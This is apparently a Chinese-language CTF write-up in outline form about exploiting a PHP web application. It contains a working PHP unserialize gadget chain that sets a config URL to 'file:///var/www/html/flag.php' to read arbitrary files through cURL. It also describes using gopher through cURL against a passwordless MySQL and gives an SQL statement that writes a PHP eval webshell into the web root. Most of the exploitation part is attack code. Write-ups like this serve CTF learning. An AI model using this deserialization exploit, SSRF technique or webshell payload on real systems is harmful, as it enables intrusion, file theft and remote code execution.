-
- MySQL没有密码，可以用cURL配合gopher打MySQL
	- 注意：没有回显
# 敏感函数
- closelog: ^^任意文件写入^^
	- 无法利用
- checkUpdate
	- cURL任意文件读取
- # 反序列化 > 伪协议
- 对所有反序列化点分析如下：
- unserialize
	- __destruct
		- dao.php: conn -> close
			- 无对应函数
	- addDpt
		- dao.php: insert_dpt
			- SQL，无法利用
	- getAllDbt
		- dao.php: get_dpt_all
			- SQL，无法利用
	- checkVersion
		- 在dao中
		- utils/fun.php: checkUpdate
			- ^^任意文件读取^^
	- clearCache
		- 无法利用
-
- ## 利用
- id:: 62f1f30e-e08a-4146-bfae-5a04a4898134
  ```php
  <?php
  class dao{
  	private $config;
  	private $conn;
  	function set_config($config) {
  		$this -> config = $config;
  	}
  }
  
  class config{
  	private $mysql_username='root';
  	private $mysql_password='';
  	private $mysql_db='sds';
  	private $mysql_port=3306;
  	private $mysql_host='localhost';
  	public $cache_dir = 'cache';
  	public $update_url = 'file:///var/www/html/flag.php';
  }
  
  $c = new config();
  $d = new dao();
  $d -> set_config($c);
  echo urlencode(base64_encode(serialize($d)));
  ?>
  ```
-
- # Gopher控制MySQL
- 此处的MySQL没有密码，可以使用Gopher控制
- 使用 ((62f14125-43fc-4da5-b83f-4d56aa1d2157)) 生成
- SQL：`select '<?php eval($_POST[data]);?>' into outfile '/var/www/html/test2.php';`
-
-
- # 参见
- ((62f27746-a352-41d4-b76d-63fc1f7c9e4f))
-
-